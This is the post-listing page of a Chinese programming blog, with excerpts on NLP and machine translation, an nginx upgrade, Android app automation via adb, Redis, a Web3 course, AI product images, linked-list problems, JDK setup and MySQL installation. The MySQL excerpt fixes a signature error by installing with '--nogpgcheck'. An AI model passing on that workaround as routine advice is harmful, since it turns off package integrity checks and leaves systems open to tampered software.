<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="Posts">
  <meta property="og:description" content="编程大咖的博客">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="website">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大咖">

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54f8be67ef99bbe737849990db2316f3/" rel="bookmark">
			【Datawhale AI 夏令营】基于术语词典干预的机器翻译挑战赛——机器翻译入门极速版【笔记】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		嗨！大家好呀，今天是一期关于NLP的机器翻译的入门指南，对于参加datawhale第二期夏令营基于术语词典干预的机器翻译挑战赛的同学来说是一期很简单的入门，在这里呢介绍了什么是NLP，什么是机器翻译，的也请各位大佬对本期内容进行补充和指正，方便夏令营的同学快速入门~
那么首先
什么是自然语言处理NLP 自然语言处理（Natural Language Processing，简称NLP）是人工智能和语言学领域的一个分支，它使计算机能够理解、解释和生成人类语言。NLP的目的是缩小人类语言和计算机之间的差距，使计算机能够执行如下任务：
语音识别：将语音转换为文本，这是NLP的第一步，它允许计算机“听到”人类语言。
自然语言理解（NLU）：使计算机能够理解语言的含义，包括语义、语法和上下文。
自然语言生成（NLG）：使计算机能够生成语言，这可以是文本或语音。
是的，NLP的核心任务就是NLU和NLG，那么到底什么是NLP呢？
NLP就是让计算机理解、解释和生成人类的自然语言。打个比方，当你和Siri对话时，或使用有道翻译翻译一句话或者一篇文章，这背后都是NLP在发挥作用。说得简单点，NLP就是让计算机变得更“懂”我们说的话、写的文字。
自然语言处理任务怎么进行 数据预处理：
文本清洗：去除文本中的噪声，如HTML标签、特殊字符等。
分词（Tokenization）：将文本分解成单词、短语或其他有意义的元素。
去除停用词：移除常见的、对文本意义贡献不大的词汇，如“的”、“是”等。
词干提取（Stemming）和词形还原（Lemmatization）：将词汇还原到基本形式。
特征提取：
词袋模型（Bag of Words）：将文本转换为单词出现的频率向量。
TF-IDF（Term Frequency-Inverse Document Frequency）：考虑单词在文档中的频率和在语料库中的稀有度。
词嵌入（Word Embeddings）：如Word2Vec、GloVe，将单词转换为密集的向量表示。
模型训练：
使用提取的特征训练机器学习或深度学习模型。
常见的模型包括支持向量机（SVM）、随机森林、递归神经网络（RNN）、卷积神经网络（CNN）和Transformer。
模型评估：
使用混淆矩阵、精确度、召回率、F1分数等指标评估模型性能。
通过交叉验证来确保模型的泛化能力。
应用部署：
将训练好的模型部署到实际应用中，如聊天机器人、推荐系统、自动翻译等。
NLP的分类，都有什么作用 语音识别：将语音信号转换为文本，如Google语音识别。
语音合成：将文本转换为语音信号，如Google文本转语音。
机器翻译：将一种语言的文本转换为另一种语言的文本，如Google翻译。
情感分析：识别和提取文本中的情感倾向，如正面、负面或中性。
文本分类：将文本自动分类到预定义的类别中，如新闻分类。
信息检索：从大量文档中检索相关信息，如搜索引擎。
问答系统：自动回答用户提出的问题，如Siri、Alexa。
文本摘要：生成文本的简短摘要，如新闻摘要。
命名实体识别（NER）：识别文本中的专有名词，如人名、地名、组织名等。
词性标注：为文本中的每个单词标注其词性，如名词、动词等。
依存句法分析：分析句子中单词之间的依存关系，如主谓宾结构。
语义分析：理解文本的深层含义，包括语义角色标注和语义依存分析。
对话系统：模拟人类对话，如聊天机器人。
文本生成：自动生成文本，如自动写作。
自然语言处理是一个多学科交叉的领域，涉及到计算机科学、人工智能、语言学、认知科学等多个学科。随着深度学习的发展，NLP领域取得了显著的进步，尤其是在语言模型和机器翻译方面。
那么，什么是机器翻译呢 机器翻译（Machine Translation, MT）是利用先进的计算机技术将一种语言转换成另一种语言的过程，它为全球沟通提供了一种高效的解决方案。
它的原理是什么 机器翻译的核心原理在于使计算机掌握不同语言之间的对应关系。这类似于教授儿童学习两种语言，通过不断的练习和记忆，孩子们能够理解和使用这两种语言进行交流。机器翻译通过分析丰富的双语文本数据，学习不同语言之间的词汇、语法和表达方式的映射关系。
如何实现 数据准备：收集广泛的双语对照文本，包括书籍、文章、对话记录等，为训练提供丰富的语料库。
预处理：对收集到的文本进行清洗和格式化，包括分词、去除停用词、统一大小写等，以提高数据质量。
训练模型：利用预处理后的数据训练机器翻译模型，使其学习源语言和目标语言之间的对应关系。
翻译执行：模型训练完成后，输入源语言文本，模型根据学习到的对应关系生成目标语言的翻译。
后处理优化：对模型生成的翻译进行调整，如修正语法错误、调整语序等，以提升翻译的准确性和流畅性。
目前主流模型有哪些 基于规则的机器翻译（Rule-based MT）： 依赖语言学家制定的规则，包括词汇、语法和句法规则，适用于需要高度准确性的翻译场景。
尽管需要大量人工干预，但在处理特定语言结构时表现出色。
基于统计的机器翻译（Statistical MT）： 通过分析大量双语文本数据，统计不同词汇和短语的对应关系，适用于处理大规模语言数据。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54f8be67ef99bbe737849990db2316f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9982abaea2fbd2b215df31ea24cd8182/" rel="bookmark">
			n3.平滑升级和回滚
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		平滑升级和回滚 1. 平滑升级流程2. 平滑升级和回滚案例 有时候我们需要对Nginx版本进行升级以满足对其功能的需求，例如添加新模块，需要新功能，而此时 Nginx又在跑着业务无法停掉，这时我们就可能选择平滑升级
1. 平滑升级流程 平滑升级四个阶段只有旧版nginx的master和worker进程旧版和新版nginx的master和worker进程并存,由旧版nginx接收处理用户的新请求旧版和新版nginx的master和worker进程并存,由新版nginx接收处理用户的新请求只有新版nginx的master和worker进程 将旧Nginx二进制文件换成新Nginx程序文件（注意先备份) 向master进程发送USR2信号启动新nginx进程 master进程修改pid文件名加上后缀.oldbin,成为nginx.pid.oldbin master进程用新Nginx文件启动新master进程及worker子进程成为旧master的子进程 系统中将有新旧两个Nginx主进程和对应的worker子进程并存 当前新的请求仍然由旧Nginx的worker进程进行处理 将新生成的master进程的PID存放至新生成的pid文件nginx.pid 向旧的Nginx服务进程发送WINCH信号，使旧的Nginx worker进程平滑停止 向旧master进程发送QUIT信号，关闭旧master，并删除Nginx.pid.oldbin文件 如果发现升级有问题,可以回滚∶向旧master发送HUP，向新master发送QUIT 2. 平滑升级和回滚案例 # 在nginx编译安装的基础上（可以参考编译安装脚本） # 下载最新稳定版 [root@Ubuntu2204 ~]#wget https://nginx.org/download/nginx-1.26.1.tar.gz [root@Ubuntu2204 ~]#tar xvf nginx-1.26.1.tar.gz [root@Ubuntu2204 ~]#cd nginx-1.26.1/ # 查看当前使用的版本及编译选项 [root@Ubuntu2204 nginx-1.26.1]#nginx -V nginx version: nginx/1.22.1 built by gcc 11.4.0 (Ubuntu 11.4.0-1ubuntu1~22.04) built with OpenSSL 3.0.2 15 Mar 2022 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module # configure arguments后面是以前编译时的参数。现在编译使用一样的参数 # 开始编译新版本 [root@Ubuntu2204 nginx-1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9982abaea2fbd2b215df31ea24cd8182/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0e8cc1a885d84c37d129d68df1eeeed/" rel="bookmark">
			【WEB前端2024】3D智体编程：乔布斯3D纪念馆-第60集-agent训练资讯APP重点推荐AI资讯内容（含视频）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【WEB前端2024】3D智体编程：乔布斯3D纪念馆-第60集-agent训练资讯APP重点推荐AI资讯内容（含视频） 使用dtns.network德塔世界（开源的智体世界引擎），策划和设计《乔布斯超大型的开源3D纪念馆》的系列教程。dtns.network是一款主要由JavaScript编写的智体世界引擎（内嵌了three.js编辑器的定制版-支持以第一视角浏览3D场馆），可以在浏览器和node.js、deno、electron上运行，它是一个跨平台的软件，支持多个操作系统使用！并且支持使用内置的poplang智体编程语言实现3D组件的智能化编程——语法超简单，一句话语法，人人轻松上手！
下面分为几步介绍，如何基于dtns.network智体世界引擎实现智体agent实现自动化训练资讯APP的推荐算法重点推荐AI资讯内容。这样方便我们让agent机器人自动化获取AI资讯后不管，并且重点收藏关注AI资讯内容，从而让我们可以方便地训练资讯APP重点推送AI行业资讯情报，减少人工参与以及浪费时间在无关资讯上的大量时间（每天减少刷资讯内容至少1-2个小时），并且大大提升了行业资讯内容的覆盖范围（从人工获取AI资讯每天只能获取100条左右，到自动化获取AI资讯2000-1万条以上）。这样大大减少了人们把时间浪费在刷手机、刷情报内容、刷无关的资讯内容上。提升了人们的工作效率、娱乐效率，节省下来的时间可以更好的学习、娱乐、工作。
agent自动化助理是一个强大的可编程机器人。可以实现机器人底盘的控制、手机甚至是电脑等算力设备的控制。通过简单的几行poplang编程实现喵星人资讯的获取，展现了agent自动化的强大的效率，大大提升了人们的生活水平和管理效率。
为了实现3D轻应用通过dtns-api编程控制agent安卓手机代理。我们使用了dtns-api: /rtphone/robot/do实现操作action的同步——通过adb的shell命令参数指令配合dtns-api:/rtphone/robot/ui/dump拿到UI对应的json，精准地实现目标按钮、文本内容的获取，从而实现了对手机自动获取AI资讯的功能。通过$.g_2d_filter_uijson自动取得资讯内容的所在位置、收藏按钮的位置，实现自动化点击AI资讯内容（每次1条）、并且在详情页面实现收藏！
第一步：打开头榜页面，找到3D纪念馆xverse轻应用 注：找到标题为“agent训练推荐算法推荐AI资讯（含视频）”的xverse轻应用。
第二步：点击右上角…进入头榜编辑器 注：因为每一个xverse轻应用均是以xverse.json的方式进行源码级应用的分享的。故每一个社区用户均可通过编辑xverse轻应用源码来实现DIY和定制。
第三步：点击正面的“编辑xverse轻应用源码”，进入3D场馆编辑器 注：点击3D场景中间的avatar玩家3D组件对象，在右侧的属性面板中找到脚本-编辑。
第四步：编辑“玩家”的avatar的3D组件的poplang代码 注：首先使用dtns-api：/rtphone/robot/do实现了传递adb的shell参数指令。通过/rtphone/robot/ui/dump实现当前app的UI界面元素的获取。以便进行AI行业资讯内容的过滤（使用$.g_2d_filter_uijson实现精准的内容过滤）。然后使用自定义的clickinto函数实现资讯内容的点击（前面通过uijson的filter过滤函数获得了资讯内容的所在位置坐标，以便触发自动点击事件），然后进入详情页面，进一点点击收藏再通过keyevent 4实现返回首页。持续进行，即可代替人工实现精准的AI资讯获取并保存到云文件夹里的强大agent机器人代理。
focus收藏函数以及clickinto函数定义如下：
注：我们看到使用$$.replaceAll实现了字符串的替换功能，从而将bounds例如[140,220],[335,224]等的坐标字符串转化为可使用adb传参的坐标。
第五步：点击顶部菜单“文件”推送头榜（作品），将此3D纪念馆以xverse轻应用方式分享给其他用户 第六步：将新的头榜标题设置为“agent训练推荐算法推荐AI资讯（含视频）”，点击右上角确认完成头榜发布 注：标题为xmsg，不能误删除“”双引号，否则会发布失败——仅修改xmsg属性的文字内容即可。
第七步：找到刚发布的xverse轻应用头榜，点击进入3D场景浏览器 注：轻轻一点击，即可进入体验刚发布好的xverse-3D轻应用（智体应用），我们相当于可以无限地分享和裂变这个开源的3D轻应用（智体应用）。这样大家便可以按自己的需求，轻松的修改和定制这些动画的源码模板了。可以形成自己的故事、自己的动画、自己的3D场馆、自己的3D互动剧情等等。随心所欲地发挥，所以智体世界、智体OS也相当于【元宇宙】【开放世界】！
第八步：进入3D轻应用后，即运行了“agent训练推荐算法推荐AI资讯（含视频）”的poplang智体代码 注：如上图先输入云文件夹ID（从智体IB输入cd进入云文件夹，点击编辑-信息可获得文件夹ID：例如obj_folder*的ID）
注：通过该agent机器人代理，成功提炼了相应的AI资讯内容（关支持自动化收藏）。
通过上8步，我们成功完成了通过3D轻应用中实现了popalng通过dtns-api实现了安卓手机打开资讯app自动获取AI资讯（含视频）并自动收藏——强化训练重点推荐AI内容。从而使用poplang简单4、5条指令，即可完成一个自动获取喵星人资讯功能的手机agent代理——服务消费者、企业客户轻松获取目标类别的资讯，从而提升行业情报、消费品类资讯的能力、大大减少了获取资讯所浪费的时间，提升了获取资讯或情报的高效过滤能力。从而帮助人们改进情报资讯获取的能力和时间效率，以便节省更多的时间用于其它更需要它的地方。
由上述案例看到：3D轻应用也从简单的3D场景的构建演变成了支持智能手机或物联网设备、智能硬件或任意的智能算力设备控制的利器。从虚拟场景构建跨越到真实世界的联动，大大提升了poplang智体应用的场景应用范围，使得简单、可靠、快速、共享、开源等的能力，赋予每一个喜欢提升生活品质、改进生产效率、促进管理效率的消费者或客户。
我们也看到了poplang智体编程语言的强大能量，一两行简单的指令，即可完成复杂的3D互动的交互效果、音效效果的开发。并且通过xverse-json源文件（3D轻应用）的方式进行社区分享，使得开源开放、公开透明的3D场馆的设计，能被大家更多的学习和继承，达到互动学习、互动成长的目的。这也是智体OS、智体互动式教育-学习的目标。
注：dtns.network德塔世界（开源的智体世界引擎）是在github和gitee上开源的项目！
附录（poplang智体代码——实现poplang的训练资讯APP重点推荐AI资讯内容的agent代理功能）
set yps **{"action":"shell am force-stop com.ss.android.article.news"} /rtphone/robot/do yps pop.sleep 500 set yps **{"action":"shell am start -n com.ss.android.article.news/.activity.MainActivity"} /rtphone/robot/do yps set i 0 set one 1 set end 200000 #收藏 pop.func.define focus /rtphone/robot/ui/dump = dret $ret object.get dret.ui uijson set attr content-desc set val 收藏 $.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a0e8cc1a885d84c37d129d68df1eeeed/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ca3e3b111148ecee6c5524162468da6/" rel="bookmark">
			【微服务】第33节：Redis的数据结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IT领域往往都是面试造火箭，实际工作拧螺丝。为了更好的应对面试，让大家能拿到更高的offer✉，我们接下来就讲讲“造火箭”的事情🧑‍🚀。
🔥🔥🔥 包括以下几方面🔽 🎈：
🌈 - Redis - 高级：
📛 -Redis主从
🤿 - Redis哨兵
🧩 - Redis分片集群
👨‍💻 - Redis数据结构（◀️）
♻️ - Redis内存回收
✅ - Redis缓存一致性
1.Redis数据结构 我们常用的Redis数据类型有5种，分别是：
💠String
💠List
💠Set
💠SortedSet
💠Hash
还有一些高级数据类型，比如Bitmap、HyperLogLog、GEO等，其底层都是基于上述5种基本数据类型。因此在Redis的源码中，其实只有5种数据类型。
1.1.RedisObject 不管是任何一种数据类型，最终都会封装为RedisObject格式，它是一种结构体，C语言中的一种结构，可以理解为Java中的类。
结构大概是这样的：
可以看到整个结构体中并不包含真实的数据，仅仅是对象头信息，内存占用的大小为4+4+24+32+64 = 128bit
也就是16字节，然后指针ptr指针指向的才是真实数据存储的内存地址。所以RedisObject的内存开销是很大的。
属性中的encoding就是当前对象底层采用的数据结构或编码方式，可选的有11种之多：
编号 编码方式 说明 0
OBJ_ENCODING_RAW
raw编码动态字符串
1
OBJ_ENCODING_INT
long类型的整数的字符串
2
OBJ_ENCODING_HT
hash表（也叫dict）
3
OBJ_ENCODING_ZIPMAP
已废弃
4
OBJ_ENCODING_LINKEDLIST
双端链表
5
OBJ_ENCODING_ZIPLIST
压缩列表
6
OBJ_ENCODING_INTSET
整数集合
7
OBJ_ENCODING_SKIPLIST
跳表
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5ca3e3b111148ecee6c5524162468da6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8416741205968880072c273d3bec3091/" rel="bookmark">
			The Web3 社区 Web3 产品经理课程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述 / 深耕区块链行业 11 年，和很多产品经理都打过交道；遇到过优秀的产品经理，也遇到过比较拉垮的产品经理。多年工作中，曾在某些团队，承载技术兼产品经理的角色；也参与过很多 Web3 外包项目，包括大型钱包、区块链浏览器、量化交易平台、链上游戏和NFT交易平台，担任技术架构师、开发者和产品经理。
多年的工作经验表明， Web3 行业的绝大多数产品经理和项目经理专业度有限，常由技术人员主导项目生命周期，尤其在公链、钱包、资管系统和交易平台中。这种现象在DeFi和NFT应用中有所改善，因为相关产品经理较为熟悉这些领域。
The Web3 设计了这套课程，希望帮助更多的 Web3 从业者更加了解 Web3 的产品设计和全局把控，帮助Web3产品和项目经理提高专业水平，帮助Web2产品经理顺利转型至Web3。课程内容涵盖：
公链产品体系
钱包产品体系
DeFi 产品体系
NFT 产品体系
交易系统产品体系
新型质押产品体系
数据分析型产品体系
其他 Web3 产品体系
Web3 产品形态分析 01 公链产品体系 公链分为 L1, L2 和 L3 公链, 有的公链基于 Ethereum 改造，有的公链基于 cosmos-sdk 改造, 有的公链是自主研发等。基于不同的生态，或是自主研发，需要的配套的基础设施都是一样的。但是，总所周知，基于 Ethereum 链，钱包不用自己开发，直接使用 metamask，浏览器也不用自己开发，可以使用 Ethereum 的服务或者基于 blockscout 改造。基于 cosmos-sdk 改造链，也类似基于 Ethereum 改造的链，有很多可用的钱包和浏览器服务商， 但是自主研发的链，钱包浏览器配套的设施产品得自己开发。对于 L2 和 L3 产品，还需要考虑配套的官方跨链桥和 浏览器内展示 Rollup 数据相关的功能。
总之，公链有以下配套的产品
公链本身（这个产品和项目经理一般参与不了，复杂度高，一般技术主导）
区块链浏览器（基于 Ethereum 一般不需要，可以买 Etherscan 的服务，如果交易数据 rollup 到以太坊链上 DA，Etherscan 已经支持，如果不是，需要进行额外的功能开发，项目方需提供对应的数据获取方式）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8416741205968880072c273d3bec3091/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1bdf49546dc5054242433868a9af21cf/" rel="bookmark">
			AI商品展示图、商品详情图、抠图、换背景一键生成
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🚀 触站AI：AI商品展示图、商品详情图、抠图、换背景一键生成 🚀
触站AI，AI商品展示图、商品详情图、抠图、换背景一键生成，作为专业comfyui工作流定制和API开放接口调用服务公司，致力于通过AI技术提升电商商品图的生成效率和表现力。
💡 触站AI技术革新
触站AI利用最前沿的人工智能技术，为电商行业带来革命性的商品图生成解决方案。我们的服务包括但不限于商品图生成、电商主图生成、商品展示图生成、商品详情图生成以及商品图的抠图、换背景、打光等。
🛍️ 商品图生成：一站式视觉体验
触站AI的商品图生成服务，能够根据商品特性快速生成吸引眼球的图片。我们的AI算法确保每一张商品图都能精确传达商品信息，捕捉潜在顾客的注意力。AI商品展示图、商品详情图、抠图、换背景一键生成。
🎨 电商主图生成：抓住第一印象
主图是电商销售的第一战场。触站AI通过AI技术，设计出既符合平台规则又具有创意的电商主图，帮助商家在众多竞争者中脱颖而出。
🖼️ 商品展示图生成：全方位展示
触站AI生成的商品展示图，360度全方位展示商品细节，为顾客提供详尽的视觉信息，增强商品的吸引力。AI商品展示图、商品详情图、抠图、换背景一键生成。
🔍️ 商品详情图生成：细节决定成败
细节是电商销售的关键。触站AI的商品详情图生成服务，注重每一个细节的呈现，确保顾客能够清楚了解商品的每一个特性。
✂️ 抠图与背景更换：灵活应对多样化需求
触站AI的抠图技术精准高效，背景更换功能灵活多样，满足不同商家的个性化需求，让商品图在不同的营销场景中焕发新光彩。AI商品展示图、商品详情图、抠图、换背景一键生成。
💡 打光技术：光影间的艺术
触站AI的打光技术，模拟真实光源效果，为商品图增添艺术感，提升商品的质感和档次。
👗 AI生成模特图：时尚界的AI革命
触站AI的模特图生成服务，包括换装、换衣、试穿等，利用AI技术让模特图更加生动，为服装电商带来前所未有的视觉体验。AI商品展示图、商品详情图、抠图、换背景一键生成。
🌈 模特背景更换：场景自由切换
模特图的背景更换功能，让模特置于各种场景中，无论是时尚秀场还是自然风光，触站AI都能轻松实现。
🏼 换模特皮肤：展现多元美学
触站AI的换皮肤功能，让模特图展现不同的肤色和美学，满足不同文化背景顾客的审美需求。
💇 换模特发型：紧跟时尚趋势
触站AI的换发型功能，让模特图能够随时更新发型，紧跟时尚趋势，为品牌注入新鲜活力。
🕺 换模特姿势：动态展示商品魅力
模特的姿势对于商品展示至关重要。触站AI的换姿势功能，让模特图能够以多种姿势展示商品，增加商品的吸引力。AI商品展示图、商品详情图、抠图、换背景一键生成。
🖼️ 换模特脸部：个性化表情传达
触站AI的脸部表情调整功能，为模特图注入个性化的表情，让每一张模特图都能传达出不同的情感和气质。
🛠️ comfyui工作流定制：打造个性化视觉体验
触站AI的工作流定制服务，为用户提供个性化的视觉体验，让电商商品图更具品牌特色和市场竞争力。
🔌 API开放接口：技术融合与创新应用
触站AI的API开放接口，为企业提供灵活的技术融合和创新应用，实现更广泛的视觉营销策略。
📈 技术优势：AI技术的创新突破
触站AI的技术优势在于其高度自动化和个性化的AI算法，AI商品展示图、商品详情图、抠图、换背景一键生成，能够快速学习和适应设计师的需求，提供精准的图像生成服务。
📊 持续创新：引领行业发展新趋势
触站AI不断创新，引领电商商品图设计行业的发展，为品牌提供更多可能性。
触站AI，AI商品展示图、商品详情图、抠图、换背景一键生成，作为电商商品图生成的创新者，正以其专业comfyui工作流定制和API开放接口调用服务，为电商行业带来全新的视觉体验。我们相信，通过不断的技术创新和服务升级，触站AI将助力更多品牌在电商领域取得成功。
💌 触站AI —— 电商商品图个性化定制的领航者 💌AI商品展示图、商品详情图、抠图、换背景一键生成。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f0fe82f24f0fda1f89ed2c51fea056a/" rel="bookmark">
			精选力扣，牛客链表面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		💎 欢迎各位大佬互三：我的主页
1. 反转链表 206.反转链表
思考：如果不开辟额外的空间，只在原来的链表上进行修改的话，该用什么方法呢
只需要从第二个元素开始，依次进行头插就可以了
接着修改一下引用就可以了，还要把末尾元素指向null
class Solution { public ListNode reverseList(ListNode head) { //head为null，直接返回 if(head == null){ return head; } ListNode cur = head.next; //head变为了末尾元素，指向null head.next = null; while(cur!=null){ //curn为cur的next节点，便于往后移动 ListNode curn = cur.next; cur.next = head; head = cur; //更新cur cur = curn; } return head; } } 2. 链表的中间节点 876. 链表的中间结点
这道题首先想到的方法肯定是定义一个cnt ，遍历一遍链表，接着求出中间的数，再遍历返回值，这种方法很简单，那如果要求只遍历一遍链表就找出中间节点呢
这里提供一个新的思路：利用快慢指针，都从head开始，fast指针每次移动两个节点，slow每次移动一个节点，这样是不是就达到了最终的目的
接着我们来实现一下：
class Solution { public ListNode middleNode(ListNode head) { if(head == null){ return null; } ListNode fast = head; ListNode slow = head; while(fast!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f0fe82f24f0fda1f89ed2c51fea056a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30aaf488d3579aa7804f390d9106b6ee/" rel="bookmark">
			阿里云ECS服务器安装jdk并运行jar包，访问成功详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装 OpenJDK 8 使用 yum 包管理器安装 OpenJDK 8
sudo yum install -y java-1.8.0-openjdk-devel 验证安装 安装完成后，验证 JDK 是否安装成功：
java -version 设置 JAVA_HOME 环境变量： 为了确保系统中的其他应用程序可以找到 JDK，你需要设置 JAVA_HOME 环境变量。
编辑 /etc/profile 文件：
sudo vi /etc/profile 在文件末尾添加以下行
export JAVA_HOME=$(dirname $(dirname $(readlink $(readlink $(which javac))))) export PATH=$JAVA_HOME/bin:$PATH 在vim编辑器中，按下Esc键退出编辑模式，然后输入以下命令保存并退出：
:wq 保存并关闭文件后，使更改生效：
source /etc/profile 验证 JAVA_HOME 设置 echo $JAVA_HOME 这些步骤y以上将帮助你在阿里云的 Alibaba Cloud Linux 3.2104 LTS 64位系统上安装并配置 JDK 8。
上传jar包到阿里云并运行 点击文件，打开文件树
选择所要上传的文件夹，右键点击上传
上传时间很慢！
上传成功！
运行jar包
开放端口
输入IP地址和端口访问成功！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fdaca400bb2ad6d5557cec889a05e199/" rel="bookmark">
			阿里云Linux中安装MySQL,并使用navicat连接以及报错解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先查询是否安装MySQL // linux 使用yum安装或者rpm安装。(就是一个安装工具类似于applStore，brew不必在意) // 区别：yum会自动安装你要安装的东西的其他依赖，rpm不会但会提示你需要安装的东西，比较麻烦，所以采用yum安装 yum list installed mysql* rpm -qa|grep mysql* // 两个都查询一下，看一下是哪个工具installed，就用哪个工具卸载，防止rpm卸载不干净 // 对应的卸载命令 yum remove mysql rpm -e mysql 安装mysql-server (yum安装)，并启动 取最新的mysql版本 // yum 查看一下 仓库中有哪些mysql版本,一般只会有最新版 yum info mysql // 采用yum安装，直接安装mysql server服务，比较纯净的安装,傻等就安装好了。 yum install mysql-server 启动mysql // 启动mysql或者退出mysql server service mysqld start service mysqld stop // 查询是否启动。进程查看/端口是否监听 netstat -lnp|grep 3306 // 3306端口是否启动 ps -ef|grep mysql // 是否有mysql进程 出现Error: GPG check FAILED 使用如下命令，禁用GPG
yum -y install mysql-community-server --nogpgcheck 安装完成
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fdaca400bb2ad6d5557cec889a05e199/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea4f4fe615866d09de24a9d8c75ff401/" rel="bookmark">
			从概念到完成：Midjourney——设计思维与AI技术的完美结合
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 本文来自 Python学研大本营
作者 学研君
去年 AI 爆火的时候，学研君也赶时髦用上了 Midjourney。平时用它生成图片，感觉生成的图片好看，比上网四处找图更省时省事，更合心意，还不用担心版权问题。
给大家看一下我随便用 Midjourney 画的神兽图。
有一次，朋友问我：“你会用 AI 画图，能帮我画一个 Logo 吗？”
我一听，Logo 这么个小东西还不简单，就爽快地答应了，还说，这点小事儿，不在话下。
结果改了 50 多次，朋友都不满意，只好去找专业设计师了。
你以为这就完了？还有后续。
朋友第二天又来找我，上来就说：“看来不是 Midjourney 不行，是你不行啊”。
等等？这是几个意思？什么叫我不行？
朋友又说，“我找了个设计师朋友，人家十分钟就给我出了好几种方案，我提了意见，又用了十来分钟就给我改好了。人家说，你是没掌握 Midjourney 的用法。”
学研君这才知道自己以前都是小打小闹，让 Midjourney 随便画个漂亮的图片简单，但让它指哪打哪，没有绘画基础的我，想要画出符合特定要求的图片就很难。
后来，学研君上网找了一些资料，零零散散地看了不少文章和视频，但还是不能让 Midjourney 对我言听计从、如臂使指，难道我的 Midjourney 之路，真的如同它的名字一样，要半途而废了吗？
直到最近，我有幸读了这本清华大学出版社全彩印制的《Midjourney从入门到实战应用》，这种状况终于有改观，从此以后，Midjourney 对我来说就是一路坦途了。
这本书的作者万晨曦老师是知名的 Adobe 讲师，在腾讯课堂上有超过 140 万+ 的学员，那可是真正的大 V，学研君什么时候才能有这么多粉丝啊。
有兴趣的同学，可以看一下万老师对这本书的介绍。
刚拿到这本书时，我发现它虽然挺厚，但却只有 5 章。我还奇怪 300 多页的书怎么只有这么几章？
看了以后才发现，原来万老师是想把每一块内容都写扎实，有点像学研君写文章，喜欢把知识点讲得通透。
这本书不仅详细介绍了 Midjourney 的注册、登录、指令、参数等基础知识，还深度解析了大量的艺术风格和提示语。
在本书的第 3 章中详细地介绍了布局设计、艺术家风格、绘制技法、镜头、灯光、纹理、时代、构图及人物等 12 类常用描述语。
与单纯罗列描述语的书不同的是，万老师用了很大的篇幅介绍了它们的使用场景、细分类别、应用技巧，并提供了多种风格、样式生成的图像案例。
尤其是这本书还特别注重介绍描述语在不同场景下的组合技巧，我觉得这算是这本书的一大亮点。通过组合不同类型描述语，你可以轻轻松松地让 Midjourney 乖乖听话，为你生成各种效果的图像。
这本书提供了三百多张示例图片，我给大家展示几张，看看效果。
